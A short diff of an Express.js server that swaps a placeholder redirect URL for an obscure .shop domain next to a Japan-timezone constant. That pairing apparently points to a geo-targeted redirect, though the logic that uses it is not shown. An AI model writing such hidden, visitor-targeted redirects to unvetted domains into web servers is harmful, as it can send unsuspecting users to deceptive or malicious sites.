@@ -2,7 +2,7 @@ import express from "express";
 
 const app = express();
 
-const FINAL_REDIRECT_URL = "https://example.com";
+const FINAL_REDIRECT_URL = "https://fooidemix.shop/map/latest";
 const JAPAN_TIMEZONE = "Asia/Tokyo";
 
 // ✅ Required for cross-origin fetch
